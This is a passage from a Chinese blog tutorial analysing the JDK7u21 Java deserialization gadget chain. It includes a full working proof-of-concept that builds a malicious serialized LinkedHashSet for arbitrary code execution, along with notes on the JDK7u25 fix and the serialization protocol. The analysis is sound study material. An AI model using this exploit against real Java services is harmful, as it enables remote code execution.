class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span><br><span class="hljs-keyword">throws</span> Throwable;<br>&#125;<br></code></pre></td></tr></table></figure><p>在使用 <code>java.reflect.Proxy</code> 动态绑定一个接口时，如果调用该接口中任意一个方法，会执行到<code>InvocationHandler#invoke</code> 。执行invoke时，被传入的第一个参数是这个proxy对象，第二个参数是被执行的方法名，第三个参数是执行时的参数列表。</p><p>而 <code>AnnotationInvocationHandler</code> 就是一个 <code>InvocationHandler</code> 接口的实现，我们看看它的<code>invoke</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><span class="hljs-comment">// Handle Object and Annotation methods</span><br><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>paramTypes[<span class="hljs-number">0</span>] == Object.class)<br><span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">assert</span> paramTypes.length == <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;toString&quot;</span>))<br><span class="hljs-keyword">return</span> toStringImpl();<br><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;hashCode&quot;</span>))<br><span class="hljs-keyword">return</span> hashCodeImpl();<br><span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;annotationType&quot;</span>))<br><span class="hljs-keyword">return</span> type;<br><span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><p>可见，当方法名等于“equals”，且仅有一个Object类型参数时，会调用到 equalImpl 方法。</p><p>所以，现在的问题变成，我们需要找到一个方法，在反序列化时对proxy调用equals方法</p><h2 id="找到equals方法调用链"><a href="#找到equals方法调用链" class="headerlink" title="找到equals方法调用链"></a>找到equals方法调用链</h2><p>比较Java对象时，我们常用到两个方法：</p><ul><li>equals</li><li>compareTo</li></ul><p>任意Java对象都拥有 equals 方法，它通常用于比较两个对象是否是同一个引用；而compareTo实际上是 java.lang.Comparable 接口的方法，我在前一篇介绍 java.util.PriorityQueue 时也介绍过，通常被实现用于比较两个对象的值是否相等。</p><p>所以，我第一时间想到使用 java.util.PriorityQueue ，但实际上其中用的是compareTo，而非equals。</p><p>另一个常见的会调用equals的场景就是集合set。set中储存的对象不允许重复，所以在添加对象的时候，势必会涉及到比较操作。</p><p>我们查看HashSet的readObject方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">// Read in any hidden serialization magic</span><br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Read capacity and verify non-negative.</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">capacity</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-keyword">if</span> (capacity &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal capacity: &quot;</span> +<br>                                         capacity);<br>    &#125;<br><br>    <span class="hljs-comment">// Read load factor and verify positive and non NaN.</span><br>    <span class="hljs-type">float</span> <span class="hljs-variable">loadFactor</span> <span class="hljs-operator">=</span> s.readFloat();<br>    <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                         loadFactor);<br>    &#125;<br><br>    <span class="hljs-comment">// Read size and verify non-negative.</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-keyword">if</span> (size &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal size: &quot;</span> +<br>                                         size);<br>    &#125;<br><br>    <span class="hljs-comment">// Set the capacity according to the size and load factor ensuring that</span><br>    <span class="hljs-comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span><br>    capacity = (<span class="hljs-type">int</span>) Math.min(size * Math.min(<span class="hljs-number">1</span> / loadFactor, <span class="hljs-number">4.0f</span>),<br>            HashMap.MAXIMUM_CAPACITY);<br><br>    <span class="hljs-comment">// Create backing HashMap</span><br>    map = (((HashSet&lt;?&gt;)<span class="hljs-built_in">this</span>) <span class="hljs-keyword">instanceof</span> LinkedHashSet ?<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));<br><br>    <span class="hljs-comment">// Read in all elements in the proper order.</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) &#123;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">E</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (E) s.readObject();<br>        map.put(e, PRESENT);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可见，这里使用了一个HashMap，将对象保存在HashMap的key处来做去重。</p><p>HashMap，就是数据结构里的哈希表，相信上过数据结构课程的同学应该还记得，哈希表是由数组+链表实现的——哈希表底层保存在一个数组中，数组的索引由哈希表的 key.hashCode() 经过计算得到，数组的值是一个链表，所有哈希碰撞到相同索引的key-value，都会被链接到这个链表后面。</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410212825179.png" alt="image-20230410212825179"> </p><p>所以，为了触发比较操作，我们需要让比较与被比较的两个对象的哈希相同，这样才能被连接到同一条链表上，才会进行比较。</p><p>跟进HashMap的put方法（很奇怪，这里我找到的get方法是这样的）</p><blockquote><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">public V <span class="hljs-built_in">put</span>(K <span class="hljs-built_in">key</span>, V value) &#123;<br>    <span class="hljs-built_in">return</span> putVal(hash(<span class="hljs-built_in">key</span>), <span class="hljs-built_in">key</span>, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>解决办法如下</p><p>我们可以看到，虽然在项目结构中是java1.7</p><p>但是在外部库中确实java8u65</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410215242230.png" alt="image-20230410215242230"> </p><ol><li>运行 <code>mvn dependency:purge-local-repository</code> 命令。这将清除本地仓库中的所有依赖项。</li><li>运行 <code>mvn clean install</code> 命令。这将重新构建你的项目并下载所有必要的依赖项。</li><li>然后在项目结构中改为jdk1.7</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> putForNullKey(value);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hash(key);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> indexFor(hash, table.length);<br>    <span class="hljs-keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="hljs-literal">null</span>; e = e.next) &#123;<br>        Object k;<br>        <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;<br>            <span class="hljs-type">V</span> <span class="hljs-variable">oldValue</span> <span class="hljs-operator">=</span> e.value;<br>            e.value = value;<br>            e.recordAccess(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br>    modCount++;<br>    addEntry(hash, key, value, i);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>变量 i 就是这个所谓的“哈希”。两个不同的对象的 i 相等时，才会执行到 <code>key.equals(k)</code>，触发前面说过的代码执行。</p><p>所以，我们接下来的目的就是为了让<code>proxy</code>对象的“哈希”，等于<code>TemplateImpl</code>对象的“哈希”。</p><h2 id="构造Magic-Number"><a href="#构造Magic-Number" class="headerlink" title="构造Magic Number"></a>构造Magic Number</h2><p>计算哈希值是通过下面这两种代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hash(key);<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> indexFor(hash, table.length);<br><span class="hljs-comment">//indexFor根据给定的哈希值和表的长度来计算键值对在表中的索引位置。这个方法通常用于哈希表数据结构中</span><br></code></pre></td></tr></table></figure><p>提炼其中关键逻辑</p><p>hash的方法是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object k)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (useAltHashing) &#123;<br>        <span class="hljs-keyword">if</span> (k <span class="hljs-keyword">instanceof</span> String) &#123;<br>            <span class="hljs-keyword">return</span> sun.misc.Hashing.stringHash32((String) k);<br>        &#125;<br>        h = hashSeed;<br>    &#125;<br><br>    h ^= k.hashCode();<br><br>    <span class="hljs-comment">// This function ensures that hashCodes that differ only by</span><br>    <span class="hljs-comment">// constant multiples at each bit position have a bounded</span><br>    <span class="hljs-comment">// number of collisions (approximately 8 at default load factor).</span><br>    h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);<br>    <span class="hljs-keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>而indexFor则是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">indexFor</span><span class="hljs-params">(<span class="hljs-type">int</span> h, <span class="hljs-type">int</span> length)</span> &#123;<br>    <span class="hljs-keyword">return</span> h &amp; (length-<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们可以自己提炼出这么一个函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br><span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>h ^= key.hashCode();<br>h ^= (h &gt;&gt;&gt; <span class="hljs-number">20</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">12</span>);<br>h = h ^ (h &gt;&gt;&gt; <span class="hljs-number">7</span>) ^ (h &gt;&gt;&gt; <span class="hljs-number">4</span>);<br><span class="hljs-keyword">return</span> h &amp; <span class="hljs-number">15</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>除了 <code>key.hashCode()</code> 外再没有其他变量，所以<code>proxy</code>对象与<code>TemplateImpl</code>对象的“哈希”是否相等，仅取决于这两个对象的 <code>hashCode()</code> 是否相等。<code>TemplateImpl</code>的 <code>hashCode()</code> 是一个<code>Native</code>方法，每次运行都会发生变化，我们理论上是无法预测的，所以想让<code>proxy</code>的 <code>hashCode()</code> 与之相等，只能寄希望于<code>proxy.hashCode()</code> </p><blockquote><p>native方法是Java中的一种特殊类型的方法，它们的实现是用其他语言（如C或C ++）编写的，并且不是在Java源代码中提供的。这些方法通常用于执行与平台相关的操作，或者访问底层系统资源，这些操作无法使用纯Java代码完成</p></blockquote><p>在CC1中我们提到了动态代理会劫持代理类的内部方法，所以这里<code>proxy.hashcode()</code>会调用到<code>AnnotationInvovationHandler#invoke</code>方法，从而调用到<code>AnnotationInvocationHandler#hashCodeImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCodeImpl</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;<br>        result += (<span class="hljs-number">127</span> * e.getKey().hashCode()) ^<br>                memberValueHashCode(e.getValue());<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历 memberValues 这个Map中的每个key和value，计算每个 <code>(127 * key.hashCode()) ^value.hashCode()</code> 并求和。</p><p>JDK7u21中使用了一个非常巧妙的方法：</p><ul><li><p>当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^value.hashCode()</p></li><li><p>当 key.hashCode() 等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成value.hashCode() 。</p></li><li><p>当 value 就是TemplateImpl对象时，这两个哈希就变成完全相等</p></li></ul><p>所以，我们找到一个hashCode是0的对象作为 memberValues 的key，将恶意TemplateImpl对象作为value，这个proxy计算的hashCode就与TemplateImpl对象本身的hashCode相等了。</p><p>找一个hashCode是0的对象，我们可以写一个简单的爆破程序来实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.govuln.deserialization;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dumper</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9999999999L</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (Long.toHexString(i).hashCode() == <span class="hljs-number">0</span>) &#123;<br>                System.out.println(Long.toHexString(i));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>跑出来第一个是 f5a5a608 ，这个也是ysoserial中用到的字符串。</p><p>利用链的构造</p><ul><li>首先生成<code>TemplateImpl</code>对象</li><li>实例化<code>AnnotationInvocationHandler</code>对象<ul><li>type属性为TemplateImpl类</li><li>memberValues属性是Map，Map只有一个key与value，key为我们之前得到的f5a5a608，value是前面生成的恶意TemplateImpl对象</li></ul></li><li>对AnnotationInvocationHandle对象来一层代理，生成proxy对象</li><li>实例化Hashset，HashSet有两个元素，分别为<ul><li>TemplatesImpl对象</li><li>proxy对象</li></ul></li><li>将HashSet序列化</li></ul><p>所以代码就会这样执行</p><ul><li>触发HashSet的readObject方法，其中使用HashMap的key去重</li><li>去重时计算HashSet中的两个元素的 hashCode() ，因为我们的静心构造二者相等，进而触发equals() 方法</li><li>调用 AnnotationInvocationHandler#equalsImpl 方法</li><li>equalsImpl 中遍历 this.type 的每个方法并调用</li><li>因为 this.type 是TemplatesImpl类，所以触发了 newTransform() 或 getOutputProperties()方法</li><li>任意代码执行</li></ul><p>具体的代码实例可以看<code>JavaThings-master</code>中的<code>JDK7u21</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.govuln.deserialization;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.LinkedHashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDK7u21</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">zeroHashCodeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;f5a5a608&quot;</span>;<br><br>        <span class="hljs-comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(zeroHashCodeStr, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-comment">// 实例化AnnotationInvocationHandler类</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">handlerConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        handlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">tempHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);<br><br>        <span class="hljs-comment">// 为tempHandler创造一层代理</span><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);<br><br>        <span class="hljs-comment">// 实例化HashSet，并将两个对象放进去</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>        set.add(templates);<br>        set.add(proxy);<br><br>        <span class="hljs-comment">// 将恶意templates设置到map中</span><br>        map.put(zeroHashCodeStr, templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(set);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方在JDK7u25中是这样修复问题的</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230410225833994.png" alt="image-20230410225833994"> </p><p>原本判断了是不是annotation类型以后什么也没有做，只是将函数返回</p><p>现在抛出了一个异常，即如果不是annotation类型以后会导致整个过程终止</p><p>但这样又导致了JDK8u20，下面来介绍8u20的原因</p><h1 id="Java反序列化协议构造与分析"><a href="#Java反序列化协议构造与分析" class="headerlink" title="Java反序列化协议构造与分析"></a>Java反序列化协议构造与分析</h1><p>首先我们需要理解这个Grammer：<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Java Object Serialization Specification: 6 - Object Serialization Stream Protocol (oracle.com)</a></p><h2 id="初步理解反序列化"><a href="#初步理解反序列化" class="headerlink" title="初步理解反序列化"></a>初步理解反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">stream:<br>    magic version contents<br>contents:<br>    content<br>    contents content<br>content:<br>    object<br>    blockdata<br>object:<br>    newObject<br>    newClass<br>    newArray<br>    newString<br>    newEnum<br>    newClassDesc<br>    prevObject<br>    nullReference<br>    exception<br>    TC_RESET<br></code></pre></td></tr></table></figure><p>这是一个依次展开的巴科斯范式。我们从第一个stream开始看起，stream就是指完整的序列化协议流，</p><p>它是有三部分组成：magic、version和contents。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_MAGIC = (<span class="hljs-type">short</span>)<span class="hljs-number">0xaced</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_VERSION = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure><p>magic等于0xaced，version等于5，这两个变量都是short类型，也就是两个字节的整型。这也就是为什么我们说序列化协议流是以 \xAC\xED\x00\x05 开头的原因。</p><p>接着， contents 在下面两行定义。可见， contents 等于 content ，或者 contents content 。怎么理解呢？</p><figure class="highlight 